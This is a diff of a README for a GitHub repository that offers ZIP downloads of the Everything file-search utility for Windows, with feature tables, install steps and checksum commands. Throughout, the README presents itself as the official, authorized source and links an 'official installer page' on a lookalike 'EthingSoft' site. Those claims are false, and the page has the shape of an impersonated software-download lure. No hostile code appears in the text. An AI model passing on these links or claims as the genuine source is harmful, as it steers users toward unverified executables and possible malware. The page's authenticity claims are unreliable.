@@ -1,56 +1,70 @@
 <div align="center">
 
-# Official Everything Downloads for Windows
+<img src="assets/voidtools-logo.png" alt="voidtools" width="176">
 
-### Official stable installers for Windows
+<img src="assets/everything-banner.svg" alt="Everything for Windows — stable x64 and x86 installers" width="100%">
 
-Download the official, unchanged **Everything** installers for Windows. Everything indexes file and folder names so you can search a large collection from a small, fast interface.
+### Official Everything installer downloads
 
-| 🪟 Platform | 📦 Package | 🏷️ Version |
-| --- | --- | --- |
-| Windows | Original installers | 1.4.1.1032 stable |
+| 🪟 Platform | 🏷️ Version | 💻 Architectures | 📦 Format |
+|:---:|:---:|:---:|:---:|
+| Windows | **1.4.1.1032 stable** | **x64** · **x86** | Separate ZIP archives |
 
-[**Download x64 installer ZIP**](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x64-Windows.zip)
+[⬇️ **Download x64 ZIP**](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x64-Windows.zip)
 &nbsp; · &nbsp;
-[**Download x86 installer ZIP**](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x86-Windows.zip)
+[⬇️ **Download x86 ZIP**](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x86-Windows.zip)
 &nbsp; · &nbsp;
-[Release notes](https://github.com/EthingSoft/everything-download/releases)
+[📋 **All releases**](https://github.com/EthingSoft/everything-download/releases)
 
 </div>
 
 ---
 
-## What Everything does
+## 🔎 About Everything
 
-Everything is a Windows desktop search utility focused on file and folder names. It builds an index, updates it as the file system changes, and filters results as you type.
+Everything is a Windows desktop search utility focused on file and folder names. It builds an index of file names and filters results as you type, so you can locate items without manually browsing through folders.
 
-- Search files and folders by name
-- Filter results with search syntax
-- Browse indexed locations from a compact desktop interface
-- Choose the installer that matches your Windows architecture
+| ✨ Feature | 📝 Details |
+|---|---|
+| ⚡ Instant results | Search results update as you type. |
+| 📁 File and folder search | Find matching names across indexed Windows volumes. |
+| 🎛️ Search filters | Refine results with Everything's search syntax. |
+| 🪶 Lightweight interface | Browse results from a compact desktop search window. |
 
-## Install
+## 📦 Choose your download
 
-1. Download the x64 installer for most modern Windows PCs, or the x86 installer for 32-bit Windows.
-2. Run the downloaded installer and review its prompts.
-3. Open Everything and enter a file or folder name to search.
+| 💻 Windows architecture | 📥 Download | 📂 Archive contents |
+|---|---|---|
+| **64-bit (x64)** — recommended for most PCs | [Everything-1.4.1.1032-x64-Windows.zip](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x64-Windows.zip) | x64 setup + `LICENSE.txt` |
+| **32-bit (x86)** | [Everything-1.4.1.1032-x86-Windows.zip](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x86-Windows.zip) | x86 setup + `LICENSE.txt` |
 
-## Package and license
+Each ZIP contains **one installer only**: choose the archive matching your Windows architecture. Beta builds and portable application packages are not included.
 
-This official distribution contains the original, unmodified Everything installers. The stable release is version **1.4.1.1032**; beta builds and portable application packages are not included. Each architecture is provided in its own ZIP with its matching installer and the required license notices.
+## 🛠️ Installation
 
-Everything is copyright © 2018 David Carpenter and is distributed under the license included in [`LICENSE.txt`](LICENSE.txt). That license permits copying and distribution subject to the included copyright and permission notice. The license file also contains the applicable notice for PCRE.
+1. Select the x64 or x86 ZIP that matches your Windows system.
+2. Extract the ZIP. It contains the matching setup program and `LICENSE.txt`.
+3. Run the setup program and follow the installation prompts.
+4. Open Everything and enter a file or folder name to search.
 
-The installers retain their valid `voidtools PTY LTD` Authenticode signature. Everything remains copyright © 2018 David Carpenter; EthingSoft provides this authorized GitHub distribution.
+## 🔐 Verify your download
 
-## Releases
+SHA-256 checksums for both ZIP archives are published in [`SHA256SUMS`](https://github.com/EthingSoft/everything-download/releases/latest/download/SHA256SUMS) and attached to the [GitHub release](https://github.com/EthingSoft/everything-download/releases/latest). In PowerShell, compare a downloaded archive's hash with the corresponding value:
 
-| Architecture | Installer ZIP |
-| --- | --- |
-| x64 | [Everything-1.4.1.1032-x64-Windows.zip](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x64-Windows.zip) |
-| x86 | [Everything-1.4.1.1032-x86-Windows.zip](https://github.com/EthingSoft/everything-download/releases/latest/download/Everything-1.4.1.1032-x86-Windows.zip) |
+```powershell
+Get-FileHash .\Everything-1.4.1.1032-x64-Windows.zip -Algorithm SHA256
+Get-FileHash .\Everything-1.4.1.1032-x86-Windows.zip -Algorithm SHA256
+```
 
-## Project links
+After extraction, Windows can also verify the installer's Authenticode signature. The original installers are signed by `voidtools PTY LTD`.
+
+## ⚖️ License and notices
+
+Everything is copyright © 2018 David Carpenter and is distributed under the terms in [`LICENSE.txt`](LICENSE.txt). The license permits redistribution subject to retaining the copyright and permission notices. The file also includes the applicable PCRE notice. A copy of the license is included in each architecture-specific ZIP and in this repository.
+
+The installers are original, unmodified files and retain their publisher signature. EthingSoft provides this authorized GitHub distribution; the software's original copyright and publisher notices remain with it.
+
+## 🔗 Project links
 
 - [Download repository and releases](https://github.com/EthingSoft/everything-download)
 - [Official Everything installer page](https://EthingSoft.github.io/)
